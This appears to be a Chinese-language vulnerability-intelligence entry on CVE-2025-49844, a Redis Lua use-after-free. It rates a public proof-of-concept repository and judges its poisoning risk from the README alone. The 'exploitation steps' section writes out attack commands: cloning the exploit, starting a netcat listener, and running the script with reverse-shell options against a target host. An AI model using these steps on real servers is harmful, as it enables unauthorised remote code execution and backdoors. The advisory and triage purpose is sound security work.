## CVE-2025-49844 - Redis Use-After-Free (UAF)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** Use-After-Free (UAF)

**影响应用:** Redis

**危害等级:** Critical

**CVSS评分:** 10.0

**影响版本:** Redis 7.2.x before 7.2.11, Redis 7.4.x before 7.4.6, Redis 8.0.x before 8.0.4, Redis 8.2.x before 8.2.2

**利用条件:** 需要认证, 需要网络访问

**POC 可用性:** 10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

该漏洞编号为CVE-2025-49844，是Redis Lua解释器中存在的一个Use-After-Free (UAF)漏洞，可导致经过身份验证的远程攻击者执行任意代码。CVSS评分高达10.0（Critical），表明其危害等级极高。受影响的Redis版本包括7.2.x系列低于7.2.11、7.4.x系列低于7.4.6、8.0.x系列低于8.0.4以及8.2.x系列低于8.2.2。

**POC有效性分析**：
所提供的POC名为“CVE-2025-49844 - Redis Lua Interpreter UAF Exploit”，其README文档展现了极高的成熟度和完整性。该POC不仅利用了Redis Lua解释器中的UAF漏洞，还集成了多项高级技术以确保利用的可靠性与成功率。具体而言，它具备绕过ASLR（地址空间布局随机化）的内存信息泄漏能力、通过ROP（Return-Oriented Programming）链绕过DEP/NX（数据执行保护/不可执行位）的能力，并采用堆喷射（Heap Spraying）技术来提高利用的稳定性。整个利用过程被设计为多阶段，包括连接与版本检查、目标架构检测（x86/x64）、堆准备、UAF对象创建、内存泄漏、ROP链构造、Shellcode执行，甚至支持建立持久化后门。POC的安装和使用说明非常详尽，提供了清晰的依赖安装步骤（如Python 3.6+、redis库），以及针对漏洞检查和反向Shell的命令行用法示例，包含主机、端口、认证密码、反向Shell监听IP和端口等参数。这些特性表明该POC是一个功能完善、可直接用于实战的完整利用工具，能够有效实现对受影响Redis实例的远程代码执行，因此被评定为质量为10分的“完整利用”类型。

**利用步骤**：
1.  **环境准备**：攻击者需确保目标Redis服务器运行于漏洞版本范围内，并且已获取其认证凭据（如果Redis配置要求认证）。攻击机器上需要安装Python 3.6+及`redis` Python库。
2.  **获取POC**：通过`git clone https://github.com/Yuri08loveElaina/CVE-2025-49844.git`命令克隆POC仓库，并进入相应目录。
3.  **安装依赖**：运行`pip install -r requirements.txt`安装所有必需的Python依赖包，然后使用`chmod +x redis-exploit.py`为Exploit脚本添加执行权限。
4.  **设置监听器（用于反向Shell）**：如果目标是获取反向Shell，攻击者需在攻击机器上启动一个网络监听器，例如使用Netcat命令`nc -lvnp 4444`监听指定端口。
5.  **执行Exploit**：
    *   **基础漏洞检查**：运行`python3 exploit.py -H <target_host> -p <port> [-a <password>]`来验证目标是否存在漏洞。
    *   **获取反向Shell**：运行`python3 exploit.py -H <target_host> -p <port> [-a <password>] -l <your_ip> -P <your_port>`，将`<target_host>`、`<port>`、`<password>`（如果需要）、`<your_ip>`和`<your_port>`替换为实际值。
6.  **后续操作**：一旦Exploit成功，攻击者将获得目标Redis服务器的远程代码执行权限，并可根据Shellcode内容执行任意命令，甚至建立持久化后门。

**投毒风险分析**：
该POC（CVE-2025-49844 Redis Lua Interpreter UAF Exploit）被评估为投毒风险较低，估计为10%。这一评估是基于其全面的README文档和对合法安全研究工具的理解。首先，该POC附带了广泛而透明的文档，详细说明了其功能、系统要求（Python 3.6+、Redis服务器）、精确的安装步骤（`git clone`、`pip install -r requirements.txt`）、清晰的使用说明（包括漏洞检查和反向Shell的示例），以及漏洞利用阶段的详细分解和受影响的Redis版本列表。这种开放性和详细指导是合法安全研究项目的典型特征，显著降低了隐藏恶意功能的可能性。恶意行为者通常倾向于混淆其工具，而不是详尽地进行文档记录。

其次，该漏洞利用工具依赖于标准且广泛认可的工具链。它需要Python 3.6+和官方的`redis` Python客户端库，这是一个用于与Redis交互的知名且信誉良好的包。安装过程利用`pip install -r requirements.txt`，这是一种标准且可审计的Python依赖管理方法。README中没有迹象表明该工具试图从非标准存储库下载或执行模糊的外部二进制文件、自定义编译器或不受信任的脚本，这些都将是投毒的重大危险信号。

第三，README中的明确免责声明指出，该工具“仅用于教育和授权的安全测试目的”，并且作者不对误用负责。这一清晰的意图声明进一步支持了其合法的研究目的。

第四，区分成功漏洞利用固有的“恶意”能力与漏洞利用工具本身中隐藏的恶意组件至关重要。所描述的功能，例如“在目标系统上执行任意Shellcode”、“建立持久性后门访问”、“通过内存信息泄漏绕过ASLR”以及“使用面向返回编程（ROP）绕过DEP/NX”，是实现*目标系统*远程代码执行（RCE）的核心功能和*目的*。它们不是由POC作者引入的、旨在损害*运行POC的用户系统*的秘密的、不必要的行为。例如，反向Shell功能是攻击者获取对*易受攻击的Redis服务器*控制权的预期结果，而不是POC在启动它的机器上创建后门。虽然未提供实际的Python代码以供直接审查，但“漏洞利用阶段”的详细分解（连接与版本检查、架构检测、堆准备、UAF对象创建、内存泄漏、ROP链构造、Shellcode执行、持久性）暗示了其复杂但可能结构化且可审计的实现。混淆这种高级内存操作和ROP技术将极大地阻碍开发、调试和维护。高质量和详尽的文档表明了专业的开发方法。

最后，没有立即发现诸如代码混淆、可疑的外部网络请求（除了指向指定的目标Redis服务器和反向Shell的攻击者监听器）或攻击者机器上不寻常的文件系统修改等危险信号。与任何强大的安全工具一样，此POC的主要风险在于其对未经授权目标的*滥用*，而不是工具本身包含用于损害用户的隐藏恶意组件。

因此，10%的投毒风险估算考虑了运行任何第三方互联网代码的一般固有（尽管最小）风险，标准Python库或`redis`客户端包中潜在的未发现漏洞，或者从高层文档中无法辨别的极其隐蔽的恶意逻辑的极低可能性。然而，根据所有可用信息，此POC似乎是一个干净、合法且专业开发的安全研究工具。

**项目地址:** https://github.com/Yuri08loveElaina/CVE-2025-49844.git

**漏洞详情:** https://www.sogou.com//link?url=hedJjaC291M7qE4dSzqOUwlMf5Dwn76IEgZUf0YF4-CCiUKZt0HZPaikX9u7Sfau4B8_A-7YHE0.
